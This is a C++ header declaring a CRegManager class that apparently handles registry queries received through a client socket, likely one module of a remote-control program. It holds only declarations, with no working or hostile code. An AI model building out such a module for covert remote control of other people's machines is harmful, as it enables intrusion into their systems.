// RegManager.h: interface for the CRegManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_REGMANAGER_H__F3FCEB28_905E_4637_9A9E_F3F8907FB3BF__INCLUDED_)
#define AFX_REGMANAGER_H__F3FCEB28_905E_4637_9A9E_F3F8907FB3BF__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CRegManager : public CManager  
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	CRegManager(CClientSocket *pClient);
	virtual ~CRegManager();

protected:
	void Find(char bToken,char* path);
};

#endif // !defined(AFX_REGMANAGER_H__F3FCEB28_905E_4637_9A9E_F3F8907FB3BF__INCLUDED_)
